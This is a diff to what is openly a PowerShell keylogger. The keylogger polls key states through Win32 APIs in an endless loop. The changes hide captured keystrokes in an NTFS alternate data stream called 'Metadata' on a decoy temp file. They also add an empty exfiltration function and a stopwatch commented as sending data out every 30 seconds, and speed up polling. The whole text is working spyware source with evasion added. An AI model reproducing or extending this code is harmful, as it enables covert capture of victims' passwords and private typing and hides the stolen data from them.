@@ -34,6 +34,16 @@ $foreground_sig = @'
 public static extern IntPtr GetForegroundWindow();
 '@
 
+function $ExfiltrateData(){
+
+}
+
+function $WriteFileStream( $Logdata ){
+	$file = "$env:temp\test_keylogger.txt"
+	Set-Content -Path $file -Value 'Some Data'
+	Add-Content -Path $file -Value $Logdata -Stream 'Metadata'
+}
+
    
 try {
     $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
@@ -42,10 +52,14 @@ try {
     $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru
     $getForeground = Add-Type -MemberDefinition $foreground_sig -name "Win32MyGetForeground" -namespace Win32Functions -passThru
 
+	#When stopwatch hits 30 seconds we exfil data
+	$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+
 	#While loop that handles all keylogging operations
     while ($true){
-		#Hold the logging every 50 milliseconds after a cycle completes to handle "strange occurances"
-        Start-Sleep -Milliseconds 50
+		#Hold the logging every 40 milliseconds after a cycle completes to handle "strange occurances"
+		Start-Sleep -Milliseconds 40
+		
         $Keystroke = ""
 
 		#First lines cycle through the keys to see if any of them are down
@@ -78,8 +92,7 @@ try {
 				if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
 
 				if ($unicode_res -gt 0) {
-                    $logfile = "$env:temp\key.log"
-                    $LogOutput | Out-File -FilePath $logfile -Append
+					$WriteFileStream($LogOutput)
                 }
 				
             }
